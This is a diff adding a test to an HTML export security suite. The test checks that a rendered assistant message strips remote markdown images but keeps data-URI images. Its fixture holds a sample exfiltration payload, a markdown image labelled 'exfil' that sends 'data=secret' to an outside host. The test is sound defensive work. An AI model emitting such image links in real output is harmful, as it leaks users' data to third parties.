@@ -250,4 +250,38 @@ describe("export html security hardening", () => {
     expect(img?.getAttribute("onerror")).toBeNull();
     expect(img?.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
   });
+
+  it("flattens remote markdown images but keeps data-image markdown", () => {
+    const dataImage = "data:image/png;base64,AAAA";
+    const session: SessionData = {
+      header: { id: "session-4", timestamp: now() },
+      entries: [
+        {
+          id: "1",
+          parentId: null,
+          timestamp: now(),
+          type: "message",
+          message: {
+            role: "assistant",
+            content: [
+              {
+                type: "text",
+                text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
+              },
+            ],
+          },
+        },
+      ],
+      leafId: "1",
+      systemPrompt: "",
+      tools: [],
+    };
+
+    const { document } = renderTemplate(session);
+    const messages = document.getElementById("messages");
+    expect(messages).toBeTruthy();
+    expect(messages?.querySelector('img[src^="https://"]')).toBeNull();
+    expect(messages?.textContent).toContain("exfil");
+    expect(messages?.querySelector(`img[src="${dataImage}"]`)).toBeTruthy();
+  });
 });
